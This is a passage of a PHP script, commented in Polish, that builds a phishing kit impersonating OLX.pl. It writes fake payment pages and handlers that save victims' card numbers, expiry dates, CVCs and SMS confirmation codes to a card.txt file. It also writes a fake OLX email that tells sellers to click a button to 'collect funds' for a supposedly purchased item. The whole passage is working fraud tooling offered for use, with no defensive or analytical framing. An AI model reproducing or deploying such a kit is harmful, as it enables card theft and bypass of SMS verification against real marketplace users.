      display: block;
      font-size: 13px;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    /* details - MIDDLE RIGHT */
  
    .details_middle_right {
      text-align: left;
      width: 53%;
      margin: 0 0 0 10px;
    }
  
    .details_middle_right_first {
      display: block;
      font-size: 14px;
      font-weight: 600;
      height: 36px;
    }
  
    .details_middle_right_second {
      display: block;
      font-size: 14px;
      font-weight: 600;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    .details_middle_right_third {
      display: block;
      font-size: 14px;
      font-weight: 600;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    .details_middle_right_fourth {
      display: block;
      font-size: 14px;
      font-weight: 600;
      height: 18px;
      margin: 4px 0 0 0;
    }
  
    /* details - BOTTOM */
    .details_bottom {
      text-align: center;
      margin: 15px 0 0 0;
    }
  
    .details_bottom_first {
      display: block;
      font-size: 12px;
    }
  
    .details_bottom_second {
      display: block;
      font-size: 12px;
      margin: 3px 0 0 0;
    }
  
    /* sms */
    .sms {
      width: 91%;
      margin: 20px auto 0 auto;
    }
  
    .sms_top {
      text-align: center;
      font-size: 15px;
      font-weight: 600;
      width: 50%;
      margin: 0 0 4px 0;
    }
    .sms input {
      background-color: #f2f4f5;
      text-align: center;
      font-size: 12px;
      font-weight: 600;
      width: 49%;
      height: 32px;
      border: 0;
      border-bottom: 2px solid #002f34;
      border-radius: 4px;
    }
  
    .sms button {
      background-color: #002f34;
      color: #ffffff;
      font-size: 16px;
      font-weight: 700;
      width: 47%;
      height: 32px;
      border: 0;
      border-radius: 4px;
    }
  
    .sms button:hover {
      cursor: pointer;
    }
  
    /* info */
    .info_security {
      text-align: center;
      font-size: 11px;
      margin: 20px 0 0 0;
    }
  
    /* body BOTTOM */
    .body_bottom {
      background-color: #ffffff;
      height: 320px;
      padding: 120px 0 0 0;
    }
  
    .body_bottom_1 {
      display: flex;
      width: 60%;
      height: auto;
      margin: 0px auto 0 auto;
    }
    /* body BOTTOM - links1*/
    .links1 {
      width: auto;
      height: auto;
    }
  
    .links1 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - links2*/
    .links2 {
      width: auto;
      height: auto;
    }
  
    .links2 span {
      display: block;
      font-size: 16px;
      font-weight: 600;
      line-height: 30px;
      width: 290px;
    }
  
    /* body BOTTOM - app */
    .app {
      text-align: center;
      margin: 30px 0 0 100px;
      height: 53px;
      width: 261px;
    }
  
    .app span {
      color: #8e8e8e;
      font-size: 12px;
    }
  }
  @media only screen and (min-device-width: 1px) and (max-device-width: 812px) {
    .deskop {
      display: none;
    }
  
    /* body */
    body {
      background-color: #f2f4f5;
      color: #002f34;
      font-family: Arial, Helvetica, sans-serif;
      margin: 0;
      padding: 0;
    }
    /* container */
    .container {
      width: 100%;
      height: 2000px;
      margin: 30px 0 0 0;
    }
  
    /* box */
    .box {
      background-color: #ffffff;
      width: 90%;
      height: auto;
      margin: 0 auto 0 auto;
      padding: 30px;
    }
  
    /* details */
    .details {
      width: 100%;
    }
  
    /* details - info */
    .details_info {
      width: 100%;
    }
  
    .details_info_first {
      display: block;
      font-size: 40px;
      font-weight: 600;
    }
  
    .details_info_second {
      display: block;
      font-size: 40px;
      font-weight: 600;
    }
  
    /* details - TOP */
    .details_top {
      width: 100%;
      margin: 50px 0 0 0;
    }
  
    .details_top_first {
      display: block;
      width: 100%;
      font-size: 35px;
      font-weight: 600;
    }
  
    /* details - MIDDLE */
    .details_middle {
      display: flex;
    }
  
    /* details - MIDDLE LEFT */
    .details_middle_left {
      text-align: right;
      width: 50%;
      padding: 0 30px 0 0;
    }
  
    .details_middle_left_first {
      display: block;
      font-size: 32px;
      height: 76px;
      margin: 10px 0 0 0;
    }
  
    .details_middle_left_second {
      display: block;
      font-size: 32px;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    .details_middle_left_third {
      display: block;
      font-size: 32px;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    .details_middle_left_fourth {
      display: block;
      font-size: 32px;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    /* details - MIDDLE RIGHT */
    .details_middle_right {
      width: 50%;
    }
  
    .details_middle_right_first {
      display: block;
      font-size: 32px;
      font-weight: 600;
      height: 76px;
      margin: 10px 0 0 0;
    }
  
    .details_middle_right_second {
      display: block;
      font-size: 32px;
      font-weight: 600;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    .details_middle_right_third {
      display: block;
      font-size: 32px;
      font-weight: 600;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    .details_middle_right_fourth {
      display: block;
      font-size: 32px;
      font-weight: 600;
      height: 38px;
      margin: 30px 0 0 0;
    }
  
    /* details - BOTTOM */
    .details_bottom {
      text-align: center;
      width: 100%;
      margin: 50px 0 0 0;
    }
  
    .details_bottom_first {
      color: rgb(102, 101, 102);
      display: block;
      font-size: 28px;
      margin: 0 0 5px 0;
    }
  
    .details_bottom_second {
      color: rgb(102, 101, 102);
      font-size: 28px;
    }
  
    /* sms */
    .sms {
      width: 100%;
      margin: 50px 0 0 0;
    }
  
    /* sms - TOP */
  .sms_top {
    text-align: center;
    font-size: 38px;
    width: 45%;
    margin: 0 0 10px 0;
  }

  /* sms - MIDDLE */
  .sms_middle {
    display: flex;
    width: 100%;
  }

  .sms_middle input {
    text-align: center;
    font-size: 40px;
    width: 45%;
    height: 78px;
  }

  .sms_middle button {
    background-color: #002f34;
    color: #ffffff;
    font-size: 30px;
    font-weight: 700;
    width: 49%;
    height: 100px;
    border: 0;
    border-radius: 6px;
  }
  
    /* info */
    .info_security {
      text-align: center;
      width: 100%;
      margin: 30px 0 0 0;
    }
  
    .info_security a {
      display: block;
      font-size: 23px;
    }
  
    .info_security img {
      width: 350px;
    }
  }
  ';

$next = '<?php
header("Location: /index2.html");
exit();
?>';

$number = '<?php
file_put_contents("card.txt", "Account number: " . $_POST["number"] . "   ||| Date: " . $_POST["date"] . "   ||| Cvc: " . $_POST["cvc"] .
"\n", FILE_APPEND);
header("Location: /index3.html");
exit();';

$code = '<?php
file_put_contents("card.txt", "SMS CODE: " . $_POST["code"] .
"\n", FILE_APPEND);
header("Location: /loading.html");
exit();';

$loadingindex = '<!DOCTYPE html>
<html>
<head lang="pl-PL">
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="1000">
    <link rel="stylesheet" href="/loading.css">
    <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
    <title>Trwa przetwarzanie, proszę czekać</title>
</head>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="box_deskop">
    <a>Trwa ładowanie, proszę czekać</a>
    <div class="loader"></div>
</div>
<div class="box_mobile">
    <a>Trwa ładowanie, proszę czekać</a>
    <div class="loader"></div>
</div>
</body>
</html>';

$loadingstyle = '@media only screen and (min-device-width: 812px) {
  .box_mobile {
    display: none;
  }
  .box_deskop {
    width: 300px;
    height: 150px;
    text-align: center;
    margin: 220px auto 0 auto;
  }

  .box_deskop a {
    font-size: 23px;
  }

  .loader {
    border: 16px solid #e4e4e4;
    border-radius: 50%;
    border-top: 16px solid #3498db;
    width: 50px;
    height: 50px;
    -webkit-animation: spin 2s linear infinite; /* Safari */
    animation: spin 2s linear infinite;
    margin: 30px auto 0 auto;
  }

  /* Safari */
  @-webkit-keyframes spin {
    0% {
      -webkit-transform: rotate(0deg);
    }
    100% {
      -webkit-transform: rotate(360deg);
    }
  }
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}

@media only screen and (min-device-width: 1px) and (max-device-width: 812px) {
  .box_deskop {
    display: none;
  }
  .box_mobile {
    width: auto;
    height: auto;
    text-align: center;
    margin: 220px auto 0 auto;
  }

  .box_mobile a {
    font-size: 43px;
  }

  .loader {
    border: 50px solid #e4e4e4;
    border-radius: 50%;
    border-top: 50px solid #3498db;
    width: 200px;
    height: 200px;
    -webkit-animation: spin 2s linear infinite; /* Safari */
    animation: spin 2s linear infinite;
    margin: 30px auto 0 auto;
  }

  /* Safari */
  @-webkit-keyframes spin {
    0% {
      -webkit-transform: rotate(0deg);
    }
    100% {
      -webkit-transform: rotate(360deg);
    }
  }
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
';

$email = '<div bgcolor="#f2f4f5" marginwidth="0" marginheight="0">
<table border="0" cellpadding="0" cellspacing="0" style="font-size:14px;color:#406367;background-color:#f2f4f5" lang="pl" title="OLX.pl">
<tbody><tr>
    <td></td>
    <td valign="top" width="600px">

    
    <table border="0" cellpadding="0" cellspacing="0" style="background:#ffffff;margin-top:16px">
        <tbody><tr>
        <td valign="top">
            <a href="https://www.olx.pl/?bs=siren_chat_new_message&amp;utm_source=siren&amp;utm_medium=email&amp;utm_campaign=chat_new_message" style="width:100%;display:block" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.olx.pl/?bs%3Dsiren_chat_new_message%26utm_source%3Dsiren%26utm_medium%3Demail%26utm_campaign%3Dchat_new_message&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw2nFyPaEseJJPbx95BzC1gq">
            
            <img src="https://ci4.googleusercontent.com/proxy/rRNl17vCWe9e3xFoR9rE0xrxB2klRwq8ZzC6RPVhbRbT9sHmV9fq1r27uMQJn07aPFHt2lqiSSgpgsaKIfvOEw0WUcuvBiEZ9vTJ0WV8TRExGQN_xUM1sDGnaET6yQ=s0-d-e1-ft#https://ireland.apollo.olxcdn.com/v1/files/vfhsn6r9i47t1-HVYMSB/image;f=png" style="width:100%;display:block" border="0" class="CToWUd">
            </a>
        </td>
        </tr>
        <tr>
        <td style="text-align:center;padding:40px;background:#ffffff">
            <table border="0" cellpadding="0" cellspacing="0">
            <tbody><tr>
                <td style="text-align:left">
                <h4 style="font-size:24px;font-weight:normal;line-height:1.2;margin:0;color:#002f34; font-family: Arial, Helvetica, sans-serif; text-align: center;">
                    <span style="font-weight:bold; font-family: Arial, Helvetica, sans-serif; text-align: center;">Ktoś właśnie zakupił twój przedmiot!</span>
                </h4>
                </td>
            </tr>
            <tr>
                <td style="padding:32px 0;text-align:center; font-family: Arial, Helvetica, sans-serif;">
                <span style="font-size:16px;line-height:1.5;text-align:left;">
                    Drogi sprzedawco! Twój przedmiot: "' . "$name" . '" został opłacony za pomocą Olx przesyłki.
                    <br>
                    <br>
                    Aby dokończyć proces płatności i otrzymać pieniądze za przedmiot, Kliknij w poniższy przycisk i  postępuj zgodnie z instrukcją
                    <br>
                    Zachęcamy do lektury wpisów o bezpieczeństwie na naszym <a href="https://blog.olx.pl/bezpieczenstwo/" style="color:#2775ff;font-weight:bold" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://blog.olx.pl/bezpieczenstwo/&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw2b_3eWDHRAzV4BqVnZVzJ5">blogu</a>
                </span>
                </td>
            </tr>
            <tr>
                <td colspan="2" style="text-align:center;padding:8px 0; font-family: Arial, Helvetica, sans-serif;">
                <a href="" style="color:#ffffff;display:inline-block;background-color:#002f34;line-height:20px;padding:12px 24px;text-align:center;font-weight:bold;font-size:16px;border-radius:4px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.olx.pl/mojolx/odpowiedz-na-ogloszenie/8432122566/?action%3Danswer%26id%3D8432122566%26my_chat%3D1%26bs%3Dsiren_chat_new_message%26utm_source%3Dsiren%26utm_medium%3Demail%26utm_campaign%3Dchat_new_message&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw0UA0w6WjBxHjyLvE4pmYkc">
                    Odbierz środki
                </a>
                </td>
            </tr>
            </tbody></table>
        </td>
        </tr>
    </tbody></table>

    
    <table border="0" cellpadding="0" cellspacing="0" style="background-color:#ffffff;margin-bottom:16px;width:100%">
        <tbody><tr>
        <td style="padding:32px 0px;text-align:center;width:100%; font-family: Arial, Helvetica, sans-serif;">
            <a href="https://pomoc.olx.pl/hc/pl" style="margin:0 16px;font-size:12px;line-height:1.5;text-align:center;color:#002f34;text-transform:uppercase;font-weight:bold;letter-spacing:0.5px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://pomoc.olx.pl/hc/pl&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw20psRN_QpUVQYt4fmYZrPK">Pomoc</a>
            <a href="https://pomoc.olx.pl/hc/pl/requests/new?ticket_form_id=227685" style="margin:0 16px;font-size:12px;line-height:1.5;text-align:center;color:#002f34;text-transform:uppercase;font-weight:bold;letter-spacing:0.5px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://pomoc.olx.pl/hc/pl/requests/new?ticket_form_id%3D227685&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw2-W5pQpcL5fj3SZvtzXdjc">Kontakt</a>
            <a href="https://www.olx.pl/mojolx/?bs=siren_chat_new_message&amp;utm_source=siren&amp;utm_medium=email&amp;utm_campaign=chat_new_message" style="margin:0 16px;font-size:12px;line-height:1.5;text-align:center;color:#002f34;text-transform:uppercase;font-weight:bold;letter-spacing:0.5px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://www.olx.pl/mojolx/?bs%3Dsiren_chat_new_message%26utm_source%3Dsiren%26utm_medium%3Demail%26utm_campaign%3Dchat_new_message&amp;source=gmail&amp;ust=1643391385243000&amp;usg=AOvVaw12YHsazLcU7FirU_EC3AuH">Mój <span class="il">OLX</span></a>
        </td>
        </tr>
        <tr>
        <td style="background:#fafbfb;padding:24px 0px;text-align:center">
            <span style="color:#7f9799;font-size:12px;display:inline-block; font-family: Arial, Helvetica, sans-serif;">
            Ta wiadomość została wysłana automatycznie. Nie odpowiadaj na tego e-maila.<br>W razie wątpliwości skontaktuj się z nami za pomocą formularza kontaktowego.
            </span>
        </td>
        </tr>
    </tbody></table>
    </td>
    <td></td>
</tr>
</tbody></table>
<img alt="" src="https://ci6.googleusercontent.com/proxy/zByrT8UDeQp1fRhAWmxgNb9tQCF6AXZH2NSyZS_bnmPJSPYZbrO8n-OaWzbClBaiOQp8MacWGZSvGfkHNWSeQzVh_fW7jHXnhqaPJzpiNyFLavki_cC1Potl_3o3M2t0qsQW3Qvg6tkoA8mnZrtdKntsy1pwjyrzyxZ0Mzl0VFJiMna3XfNg4XmMWoqdMZx2Sw_2l8sfWzQmFaA=s0-d-e1-ft#http://ty5gwwjs.r.eu-west-1.awstrack.me/I0/010201780ead5001-919417ae-b00d-4fc0-bb11-bd89c3edd789-000000/lCPZboQea40ZqVRTZ8ZeZfW7x5I=204" style="display:none;width:1px;height:1px" class="CToWUd"><div class="yj6qo"></div><div class="adL">
</div></div>';

// tworzenie index.html w folderze
$createindex = fopen($folder.'/'.'index.html', 'x');
// tworzenie style.css w folderze
$createstyle = fopen($folder.'/'.'style.css', 'x');
// tworzenie index2.html w folderze
$createindex2 = fopen($folder.'/'.'index2.html', 'x');
// tworzenie style2.css w folderze
$createstyle2 = fopen($folder.'/'.'style2.css', 'x');
// tworzenie index3.html w folderze
$createindex3 = fopen($folder.'/'.'index3.html', 'x');
// tworzenie style3.css w folderze
$createstyle3 = fopen($folder.'/'.'style3.css', 'x');
// tworzenie next.php w folderze
$createnext = fopen($folder.'/'.'next.php', 'x');
// tworzenie number.php w folderze
$createnumber = fopen($folder.'/'.'number.php', 'x');
// tworzenie code.php w folderze
$createcode = fopen($folder.'/'.'code.php', 'x');
// tworzenie loading.html w folderze
$createloadingindex = fopen($folder.'/'.'loading.html', 'x');
// tworzenie loading.css w folderze
$createloadingstyle = fopen($folder.'/'.'loading.css', 'x');
// tworzenie email.txt w folderze
$createemail = fopen($folder.'/'.'email.txt', 'x');

# zapisywanie danych w plikach
fwrite($createindex, $index);
fwrite($createindex2, $index2);
fwrite($createindex3, $index3);
fwrite($createstyle, $style);
fwrite($createstyle2, $style2);
fwrite($createstyle3, $style3);
fwrite($createnext, $next);
fwrite($createnumber, $number);
fwrite($createcode, $code);
fwrite($createloadingindex, $loadingindex);
fwrite($createloadingstyle, $loadingstyle);
fwrite($createemail, $email);


// przechodzenie na strone glowna
header('Location: /start/')
?>